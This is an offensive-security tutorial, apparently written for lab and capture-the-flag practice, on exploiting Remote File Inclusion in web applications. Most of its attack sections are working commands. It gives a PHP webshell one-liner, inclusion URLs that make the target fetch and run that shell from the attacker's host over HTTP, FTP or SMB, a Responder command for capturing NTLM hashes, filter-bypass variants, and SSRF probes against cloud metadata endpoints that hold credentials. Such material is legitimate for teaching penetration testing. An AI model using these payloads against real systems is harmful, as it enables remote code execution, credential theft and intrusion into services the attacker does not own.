# Remote File Inclusion
RFI is the more powerful sibling of LFI. Where LFI reads files that already exist on the target server, RFI instructs the server to fetch and execute a file hosted on infrastructure you control. The attack surface shifts from what is on their server to what you can make their server request.

***
## LFI vs RFI: The Key Relationship
Almost every RFI vulnerability is simultaneously an LFI vulnerability, because any function that can include remote URLs can also include local paths. The reverse is not true. An LFI does not automatically imply RFI capability, for three reasons:

- The vulnerable function may only support local file paths by design
- You may only control a portion of the parameter, not the full protocol prefix
- Server configuration may block outbound requests to external hosts entirely

The functions that support remote URL inclusion are a subset of those vulnerable to LFI:

| Function | Language | Execute | Remote URL |
|----------|----------|:-------:|:----------:|
| `include()` / `include_once()` | PHP | Yes | Yes (requires `allow_url_include`) |
| `file_get_contents()` | PHP | No | Yes |
| `import` | Java | Yes | Yes |
| `@Html.RemotePartial()` | .NET | No | Yes |
| `include` | .NET | Yes | Yes |

Functions that allow remote URLs but do not execute are still valuable for [Server-Side Request Forgery (SSRF)](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery) attacks: you can probe internal ports and services that are not accessible from the outside.

***
## Verifying RFI Before Attacking
Confirming `allow_url_include = On` in `php.ini` is a necessary but not sufficient check. The most reliable confirmation is a live test using a loopback URL, which avoids triggering firewall rules while still proving whether remote inclusion works:

```
http://TARGET/index.php?language=http://127.0.0.1:80/index.php
```

If the page renders content from the loopback address inside the vulnerable section, RFI is confirmed and the function executes PHP. From there, replace the loopback URL with your own server address. Note that including the same page recursively, for example `index.php` including itself, can trigger an infinite inclusion loop that causes a denial of service, so use a different target file for this test in production assessments.

***
## Delivery Method 1: HTTP
The simplest delivery method is a Python HTTP server. Use common ports like 80 or 443 because outbound connections on non-standard ports are frequently blocked by egress firewall rules on production servers, while 80 and 443 are almost universally permitted.

**Set up the listener:**
```bash
# Simple Python server on port 80
sudo python3 -m http.server 80

# Or Apache/Nginx if you need HTTPS on 443
```

**Create the webshell:**
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

**Trigger the inclusion:**
```
http://TARGET/index.php?language=http://YOUR_IP/shell.php&cmd=id
```

When the server fetches `shell.php`, your Python server logs the GET request confirming delivery:
```
TARGET_IP - - [date] "GET /shell.php HTTP/1.0" 200 -
```

If you notice the application is appending `.php` to your URL, omit the extension from your filename on your server so the request still resolves correctly.

***
## Delivery Method 2: FTP
FTP is useful when outbound HTTP connections are blocked by a WAF or firewall, because FTP traffic on port 21 has a different signature and may pass through rules that block HTTP-based payloads.  [Impacket's pyftpdlib](https://github.com/giampaolo/pyftpdlib) provides a quick anonymous FTP server: 

```bash
sudo python3 -m pyftpdlib -p 21
```

Then reference the file using the `ftp://` scheme:
```
http://TARGET/index.php?language=ftp://YOUR_IP/shell.php&cmd=id
```

PHP attempts anonymous authentication by default. If the server requires credentials, embed them directly in the URL:
```bash
curl 'http://TARGET/index.php?language=ftp://user:pass@YOUR_IP/shell.php&cmd=id'
```

***
## Delivery Method 3: SMB (Windows Targets Only)
The SMB delivery method is the most significant RFI technique for Windows targets because it does not require `allow_url_include` to be enabled at all. Windows treats UNC paths (`\\server\share\file`) as regular file references at the OS level, completely bypassing PHP's URL inclusion restrictions. 

[Impacket's smbserver](https://github.com/fortra/impacket) creates an SMB share with anonymous access in one command:

```bash
impacket-smbserver -smb2support share $(pwd)
```

Reference the shell using a UNC path:
```
http://TARGET/index.php?language=\\YOUR_IP\share\shell.php&cmd=whoami
```

SMB also opens a secondary attack vector beyond RCE: because Windows automatically attempts NTLM authentication when accessing a remote SMB share, you can capture the server's NTLM hash using [Responder](https://github.com/lgandx/Responder) instead of serving a shell. This hash can then be cracked offline or used in a pass-the-hash attack to authenticate as the server's machine account:

```bash
# Instead of smbserver, run Responder to capture NTLM hashes
sudo responder -I tun0
# Then trigger the RFI with a UNC path pointing to your Responder listener
```

This technique works even on patched systems and does not require any vulnerability beyond the RFI itself. The limitation is that SMB over the internet is blocked on most networks, so this is most reliable in internal network assessments or HTB-style lab environments where you are on the same network segment as the target.

***
## Protocol Fallback Strategy
When the standard `http://` scheme is blocked, work through alternatives in order:

```
1. http://YOUR_IP/shell.php          # First attempt, most common
2. https://YOUR_IP/shell.php         # If HTTP is blocked but HTTPS allowed
3. ftp://YOUR_IP/shell.php           # Different protocol signature
4. \\YOUR_IP\share\shell.php         # Windows only, bypasses allow_url_include
5. //YOUR_IP/shell.php               # Protocol-relative URL, sometimes bypasses filters
```

For WAF bypass when `http://` as a string is being filtered: 
```
http://YOUR_IP/shell.php     # blocked
HTTP://YOUR_IP/shell.php     # case variation
hTtP://YOUR_IP/shell.php     # mixed case
http://YOUR_IP//shell.php    # extra slash
```

***
## RFI vs SSRF: The Dual Use
When the vulnerable function supports remote URLs but does not execute code (like `file_get_contents()`), RFI pivots into SSRF. You can probe internal services that are not reachable from the internet by pointing the include at internal addresses:

```
# Probe internal ports
http://TARGET/index.php?language=http://127.0.0.1:8080/admin
http://TARGET/index.php?language=http://127.0.0.1:3306/
http://TARGET/index.php?language=http://192.168.1.1/router-admin

# Cloud metadata endpoints (critical in AWS/GCP/Azure environments)
http://TARGET/index.php?language=http://169.254.169.254/latest/meta-data/
```

The AWS Instance Metadata Service at `169.254.169.254` returns IAM credentials, instance identity, and network configuration. A single SSRF via RFI against an AWS-hosted application can produce credentials with broad cloud permissions, making it one of the highest-impact variations of this attack class.
